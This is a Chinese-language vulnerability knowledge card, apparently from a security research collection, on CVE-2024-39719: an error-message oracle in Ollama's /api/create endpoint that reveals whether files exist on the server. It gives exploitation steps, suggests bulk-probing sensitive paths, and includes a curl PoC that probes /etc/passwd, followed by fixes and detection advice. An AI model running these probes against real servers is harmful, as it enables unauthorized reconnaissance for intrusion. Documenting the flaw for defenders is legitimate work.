---
id: web-generic-ollama-create-path-file-existence-oracle
title: Ollama /api/create path 参数差异化错误消息导致服务器文件存在性探测（CVE-2024-39719）
type: scenario
domain: web
path: web/generic
technique: api-error-message-file-existence-oracle
aliases:
- Ollama 文件存在性泄露
- File Existence Disclosure
- 错误消息文件探测 oracle
tags:
- ollama
- information-disclosure
- error-message
- file-existence
- oracle
cve: CVE-2024-39719
affected_versions: <= 0.3.14
severity: low
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
artifact: knowledge/web/generic/web-generic-ollama-create-path-file-existence-oracle.md
verification:
  verified_by: verifier-T1-34
  verified_at: '2026-11-08T18:08:01+08:00'
  notes: 已对照原文核对：affected_versions「<= 0.3.14」与原文「Ollama 0.3.14 及之前的所有版本」一致(实测环境0.1.33/0.3.14均在区间内)；差异化错误oracle证据img01(/etc/passwd→no FROM line)、img02(/file/not-exists→no such file or directory)均佐证；卡正文未混入原文利用脚本中CVE-2024-39722/0.1.45的笔误注释
---

## 一句话结论

对未授权暴露的 Ollama（<= 0.3.14），向 /api/create 传递 path 参数指向不同文件路径时，服务端返回两种可区分的错误消息，构成文件存在性 oracle，可远程探测服务器上任意文件/目录是否存在。

## 原理

Ollama 的 CreateModel API 接受 path 参数并按其读取本地模型文件（Modelfile）。当路径不存在时，文件系统 open 报错被原样拼进响应：`error reading modelfile: open <path>: no such file or directory`；当文件存在但内容不是合法 Modelfile（无 FROM 行）时则返回 `no FROM line for the model was specified`。服务端没有统一错误处理、也没有对用户输入路径做验证过滤，直接把文件系统层错误回显给客户端，两类响应的差异即为存在性判定依据。

## 触发条件

- 目标运行 Ollama <= 0.3.14，且 /api/create 端点对攻击者可达（默认 11434 端口无认证）。

## 利用步骤

1. （可选）GET /api/version 确认版本 <= 0.3.14；
2. 探测不存在的文件：`curl "http://target:11434/api/create" -d '{"name":"t","path":"/tmp/non-existing"}'`，响应含 `no such file or directory`；
3. 探测存在的文件：`curl "http://target:11434/api/create" -d '{"name":"t","path":"/etc/passwd"}'`，响应为 `no FROM line for the model was specified`；
4. 脚本化批量探测关键路径（配置文件、证书、敏感数据文件），以此收集服务器文件结构信息，作为后续攻击的前置侦察。注意不同版本的具体错误文案可能有差异，需按响应可区分性而非固定文案判断。

## PoC

```
$ curl "http://target:11434/api/create" -d '{"name":"t","path":"/etc/passwd"}'
{"error":"no FROM line for the model was specified"}          # 文件存在

$ curl "http://target:11434/api/create" -d '{"name":"t","path":"/file/not-exists"}'
{"error":"error reading modelfile: open /file/not-exists: no such file or directory"}   # 文件不存在
```

## 变体与关联

- 同类模式：任何把文件系统层异常（open 失败、权限拒绝、is-a-directory 等）原样回显给客户端的 API，都可构造存在性/类型 oracle；
- 与 Ollama 同产品其他问题互补：未授权 API 滥用（模型管理/推理）与 digest 路径遍历（CVE-2024-37032 任意文件读写），本漏洞危害更低，主要用于侦察阶段；
- 修复方式：统一错误处理、采用不暴露文件系统信息的通用错误消息、严格校验用户输入路径。

## 检测与防御

- 升级 Ollama 至修复版本；不要将 11434 端口暴露公网；
- 监控 /api/create 端点的异常访问模式（大量携带不同 path 的请求）；
- 服务端错误响应统一化，不回显底层文件系统异常细节。
